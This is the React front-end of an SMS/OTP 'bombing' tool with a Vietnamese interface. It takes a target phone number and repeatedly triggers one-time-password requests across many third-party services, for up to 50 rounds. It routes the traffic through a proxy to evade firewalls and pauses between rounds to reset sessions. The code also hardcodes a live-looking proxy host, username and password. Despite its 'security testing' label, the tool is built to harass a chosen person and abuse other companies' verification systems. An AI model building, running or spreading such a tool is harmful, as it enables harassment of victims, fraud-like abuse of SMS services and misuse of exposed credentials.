
import React, { useState, useEffect, useRef, useCallback } from 'react';
import { 
  Zap, Terminal, Smartphone, Activity, RefreshCw, 
  CheckCircle2, XCircle, Shield, ShieldCheck, 
  ShieldAlert, Settings, Globe, Database, Lock, User
} from 'lucide-react';
import { OTP_SERVICES, triggerOTP } from './services/otpServices';
import { ServiceDefinition, LogEntry, SpamStats, ProxyConfig, ProxyItem } from './types';

const App: React.FC = () => {
  const [phoneNumber, setPhoneNumber] = useState('');
  const [cycles, setCycles] = useState(4);
  const [isSpamming, setIsSpamming] = useState(false);
  const [services, setServices] = useState<ServiceDefinition[]>(OTP_SERVICES);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [stats, setStats] = useState<SpamStats>({
    totalSent: 0, successCount: 0, failureCount: 0, currentCycle: 0, totalCycles: 0
  });
  
  // Cấu hình Proxy riêng lẻ theo ảnh người dùng cung cấp
  const [proxyHost, setProxyHost] = useState('180.93.230.148');
  const [proxyPort, setProxyPort] = useState('30281');
  const [proxyUser, setProxyUser] = useState('gx66hgve');
  const [proxyPass, setProxyPass] = useState('pLOC8j2C');
  const [proxyEnabled, setProxyEnabled] = useState(true);
  
  const logEndRef = useRef<HTMLDivElement>(null);
  const stopRef = useRef(false);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const addLog = useCallback((service: string, message: string, type: LogEntry['type']) => {
    setLogs(prev => [{
      id: Math.random().toString(36),
      timestamp: new Date().toLocaleTimeString(),
      service, message, type
    }, ...prev].slice(0, 100));
  }, []);

  const runPayload = async () => {
    if (!phoneNumber || phoneNumber.length < 9) {
      addLog('SYSTEM', "Số điện thoại mục tiêu không hợp lệ", 'error');
      return;
    }
    
    stopRef.current = false;
    setIsSpamming(true);
    setStats({ totalSent: 0, successCount: 0, failureCount: 0, currentCycle: 1, totalCycles: cycles });
    addLog('SYSTEM', `Bắt đầu tấn công đợt 1/${cycles} (${proxyEnabled ? 'Qua Proxy' : 'Trực tiếp'})`, 'info');

    const currentProxy: ProxyConfig = {
      rawList: `${proxyHost}:${proxyPort}:${proxyUser}:${proxyPass}`,
      pool: [{ host: proxyHost, port: proxyPort, user: proxyUser, pass: proxyPass }],
      enabled: proxyEnabled
    };

    for (let c = 1; c <= cycles; c++) {
      if (stopRef.current) break;
      setStats(prev => ({ ...prev, currentCycle: c }));

      for (const svc of services) {
        if (stopRef.current) break;
        setServices(prev => prev.map(s => s.id === svc.id ? { ...s, status: 'Pending' } : s));
        
        const res = await triggerOTP(svc.id, phoneNumber, currentProxy);
        
        if (res.success) {
          setStats(prev => ({ ...prev, totalSent: prev.totalSent + 1, successCount: prev.successCount + 1 }));
          setServices(prev => prev.map(s => s.id === svc.id ? { ...s, status: 'Success' } : s));
          addLog(svc.name, res.response, 'success');
        } else {
          setStats(prev => ({ ...prev, totalSent: prev.totalSent + 1, failureCount: prev.failureCount + 1 }));
          setServices(prev => prev.map(s => s.id === svc.id ? { ...s, status: 'Error' } : s));
          addLog(svc.name, res.response, 'error');
        }
        // Delay 1.5s giữa các service để tránh bị firewall local chặn
        await new Promise(r => setTimeout(r, 1500));
      }
      
      if (c < cycles && !stopRef.current) {
        addLog('SYSTEM', "Nghỉ 10 giây để reset session...", 'warning');
        await new Promise(r => setTimeout(r, 10000));
        addLog('SYSTEM', `Bắt đầu đợt ${c + 1}/${cycles}...`, 'info');
      }
    }
    
    setIsSpamming(false);
    addLog('SYSTEM', "Tiến trình hoàn tất.", 'info');
  };

  return (
    <div className="min-h-screen bg-[#050914] p-6 lg:p-10 font-sans text-slate-300">
      <div className="max-w-7xl mx-auto flex flex-col gap-8">
        
        {/* Header - Stealth Style */}
        <header className="flex items-center justify-between bg-[#0a1122] border border-[#1a253d] p-6 rounded-2xl shadow-2xl">
          <div className="flex items-center gap-5">
            <div className="bg-emerald-500/10 p-4 rounded-xl border border-emerald-500/20">
              <Zap className="w-8 h-8 text-emerald-400 fill-emerald-400/20" />
            </div>
            <div>
              <h1 className="text-2xl font-black text-white tracking-tighter uppercase italic flex items-center gap-3">
                OTP <span className="text-emerald-400">PROXY STEALTH</span>
              </h1>
              <p className="text-[10px] text-slate-500 font-bold uppercase tracking-[0.3em]">Advanced Security Testing Node</p>
            </div>
          </div>
          <button className="bg-emerald-500/5 hover:bg-emerald-500/10 border border-emerald-500/20 px-6 py-3 rounded-xl flex items-center gap-3 text-emerald-400 text-xs font-black uppercase transition-all">
            <Settings className="w-4 h-4" /> Proxy Config
          </button>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
          
          {/* Left Column - Inputs */}
          <div className="lg:col-span-4 space-y-8">
            
            {/* Target Entry */}
            <div className="bg-[#0a1122] border border-[#1a253d] p-8 rounded-3xl shadow-xl space-y-8">
              <h2 className="text-xs font-black text-slate-200 uppercase tracking-widest flex items-center gap-3">
                <Smartphone className="w-4 h-4 text-emerald-500" /> Target Entity
              </h2>
              
              <div className="space-y-6">
                <div>
                  <label className="text-[9px] font-black text-slate-600 uppercase tracking-[0.2em] mb-3 block">Phone Number</label>
                  <input 
                    type="tel" 
                    value={phoneNumber}
                    onChange={e => setPhoneNumber(e.target.value)}
                    placeholder="0772734911" 
                    className="w-full bg-[#050914] border border-[#1a253d] rounded-xl p-5 text-white font-mono text-xl focus:border-emerald-500/40 outline-none transition-all placeholder:text-slate-800"
                  />
                </div>

                <div>
                  <div className="flex justify-between items-center mb-3">
                    <label className="text-[9px] font-black text-slate-600 uppercase tracking-[0.2em]">Intensity</label>
                    <span className="text-emerald-400 font-mono text-xs font-black">{cycles} ROUNDS</span>
                  </div>
                  <input 
                    type="range" min="1" max="50" value={cycles}
                    onChange={e => setCycles(parseInt(e.target.value))}
                    className="w-full h-1.5 bg-slate-900 rounded-full appearance-none accent-emerald-500 cursor-pointer"
                  />
                </div>

                <button 
                  onClick={isSpamming ? () => stopRef.current = true : runPayload}
                  className={`w-full py-5 rounded-xl font-black uppercase text-xs tracking-[0.2em] transition-all flex items-center justify-center gap-3 shadow-lg ${isSpamming ? 'bg-red-500/10 text-red-500 border border-red-500/20 hover:bg-red-500/20' : 'bg-emerald-500 text-[#050914] hover:bg-emerald-400 shadow-emerald-500/10'}`}
                >
                  {isSpamming ? <><XCircle className="w-4 h-4" /> Abort Session</> : <><Zap className="w-4 h-4 fill-current" /> Execute Payload</>}
                </button>
              </div>
            </div>

            {/* Proxy Settings - Grid based on photo */}
            <div className="bg-[#0a1122] border border-[#1a253d] p-8 rounded-3xl shadow-xl space-y-8">
               <div className="flex items-center justify-between">
                <h2 className="text-xs font-black text-slate-200 uppercase tracking-widest flex items-center gap-3">
                  <Globe className="w-4 h-4 text-emerald-500" /> Proxy Settings
                </h2>
                <label className="relative inline-flex items-center cursor-pointer">
                  <input type="checkbox" checked={proxyEnabled} onChange={e => setProxyEnabled(e.target.checked)} className="sr-only peer" />
                  <div className="w-11 h-6 bg-slate-900 border border-slate-800 rounded-full peer peer-checked:bg-emerald-600 after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:after:translate-x-full"></div>
                </label>
               </div>

               <div className="space-y-4 opacity-90">
                  <div className="flex gap-4">
                    <div className="flex-1">
                      <input value={proxyHost} onChange={e => setProxyHost(e.target.value)} placeholder="IP" className="w-full bg-[#050914] border border-[#1a253d] rounded-xl p-4 text-xs font-mono text-slate-400 focus:border-emerald-500/30 outline-none" />
                    </div>
                    <div className="w-24">
                      <input value={proxyPort} onChange={e => setProxyPort(e.target.value)} placeholder="Port" className="w-full bg-[#050914] border border-[#1a253d] rounded-xl p-4 text-xs font-mono text-slate-400 focus:border-emerald-500/30 outline-none" />
                    </div>
                  </div>
                  <div className="flex gap-4">
                    <div className="flex-1">
                      <input value={proxyUser} onChange={e => setProxyUser(e.target.value)} placeholder="User" className="w-full bg-[#050914] border border-[#1a253d] rounded-xl p-4 text-xs font-mono text-slate-400 focus:border-emerald-500/30 outline-none" />
                    </div>
                    <div className="flex-1 relative">
                      <input type="password" value={proxyPass} onChange={e => setProxyPass(e.target.value)} placeholder="Pass" className="w-full bg-[#050914] border border-[#1a253d] rounded-xl p-4 text-xs font-mono text-slate-400 focus:border-emerald-500/30 outline-none" />
                    </div>
                  </div>
                  <p className="text-[9px] text-slate-700 italic">Hỗ trợ Rotating Proxy (HTTP/HTTPS) để vượt tường lửa.</p>
               </div>
            </div>

            {/* Stats Dashboard */}
            <div className="grid grid-cols-2 gap-4">
              <div className="bg-[#0a1122] border border-[#1a253d] p-5 rounded-2xl flex flex-col items-center">
                <span className="text-[8px] font-black text-slate-700 uppercase mb-2">Delivered</span>
                <span className="text-3xl font-black text-emerald-500 mono">{stats.successCount}</span>
              </div>
              <div className="bg-[#0a1122] border border-[#1a253d] p-5 rounded-2xl flex flex-col items-center">
                <span className="text-[8px] font-black text-slate-700 uppercase mb-2">Blocked</span>
                <span className="text-3xl font-black text-red-500 mono">{stats.failureCount}</span>
              </div>
            </div>
          </div>

          {/* Right Column - Service & Monitor */}
          <div className="lg:col-span-8 space-y-8">
            
            {/* Service Grid */}
            <div className="bg-[#0a1122] border border-[#1a253d] p-8 rounded-[2rem] shadow-xl">
               <h2 className="text-xs font-black text-slate-200 uppercase tracking-widest flex items-center gap-3 mb-8">
                <Activity className="w-4 h-4 text-emerald-500" /> Service Grid
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
                {services.map(svc => (
                  <div key={svc.id} className={`p-6 rounded-2xl border transition-all duration-300 ${svc.status === 'Idle' ? 'bg-[#050914]/40 border-slate-900/50 opacity-40' : svc.status === 'Pending' ? 'border-emerald-500/40 bg-emerald-500/5' : svc.status === 'Success' ? 'border-emerald-500 bg-emerald-500/10' : 'border-red-500/40 bg-red-500/5'}`}>
                    <div className="flex justify-between items-center mb-5">
                      <span className="text-[10px] font-black text-white uppercase tracking-wider">{svc.name}</span>
                      <div className={`w-1.5 h-1.5 rounded-full ${svc.status === 'Idle' ? 'bg-slate-800' : svc.status === 'Pending' ? 'bg-emerald-400 animate-pulse' : svc.status === 'Success' ? 'bg-emerald-500 shadow-[0_0_10px_#10b981]' : 'bg-red-500 shadow-[0_0_10px_#ef4444]'}`} />
                    </div>
                    <div className="h-0.5 w-full bg-slate-900 rounded-full overflow-hidden">
                      {svc.status === 'Pending' && <div className="h-full bg-emerald-400 w-full animate-progress" />}
                      {svc.status === 'Success' && <div className="h-full bg-emerald-500 w-full" />}
                      {svc.status === 'Error' && <div className="h-full bg-red-500 w-full" />}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Traffic Monitor Log */}
            <div className="bg-[#050914] border border-[#1a253d] rounded-[2rem] h-[500px] flex flex-col shadow-inner relative overflow-hidden">
              <div className="p-6 bg-[#0a1122]/80 border-b border-[#1a253d] flex items-center justify-between backdrop-blur-md sticky top-0 z-10">
                <div className="flex items-center gap-4">
                  <Terminal className="w-4 h-4 text-emerald-500" />
                  <span className="text-[10px] font-black text-slate-500 uppercase tracking-[0.4em]">Traffic_Monitor_Log</span>
                </div>
                <div className="flex gap-1.5">
                  <div className="w-2 h-2 rounded-full bg-red-500/20" />
                  <div className="w-2 h-2 rounded-full bg-amber-500/20" />
                  <div className="w-2 h-2 rounded-full bg-emerald-500/40" />
                </div>
              </div>
              
              <div className="flex-1 overflow-y-auto p-8 space-y-4 font-mono text-[11px] custom-scrollbar scroll-smooth">
                {logs.length === 0 && (
                  <div className="h-full flex flex-col items-center justify-center text-slate-800 opacity-20 italic select-none">
                    <Activity className="w-12 h-12 mb-4 animate-pulse" />
                    <span className="tracking-[0.5em] uppercase text-[9px]">Awaiting Uplink...</span>
                  </div>
                )}
                {logs.map(log => (
                  <div key={log.id} className="flex gap-4 group animate-in slide-in-from-left-2 duration-300">
                    <span className="text-slate-800 shrink-0 select-none">[{log.timestamp}]</span>
                    <span className={`font-black shrink-0 px-2 py-0.5 rounded text-[8px] tracking-widest border ${log.type === 'success' ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20' : log.type === 'error' ? 'bg-red-500/10 text-red-400 border-red-500/20' : 'bg-blue-500/10 text-blue-400 border-blue-500/20'}`}>
                      {log.service.toUpperCase()}
                    </span>
                    <span className={`${log.type === 'error' ? 'text-red-400/70' : 'text-slate-400 group-hover:text-slate-100 transition-colors'}`}>
                      {log.message}
                    </span>
                  </div>
                ))}
                <div ref={logEndRef} />
              </div>

              {/* Scan Overlay Effect */}
              <div className="absolute inset-0 pointer-events-none bg-gradient-to-b from-transparent via-emerald-500/[0.02] to-transparent h-1/2 animate-scan opacity-20" />
            </div>
          </div>
        </div>
      </div>
      
      <style>{`
        .custom-scrollbar::-webkit-scrollbar { width: 4px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #1a253d; border-radius: 10px; }
        
        @keyframes scan {
          from { transform: translateY(-100%); }
          to { transform: translateY(200%); }
        }
        .animate-scan {
          animation: scan 4s linear infinite;
        }

        @keyframes progress {
          0% { transform: translateX(-100%); }
          100% { transform: translateX(100%); }
        }
        .animate-progress {
          animation: progress 1.5s infinite linear;
        }
      `}</style>
    </div>
  );
};

export default App;
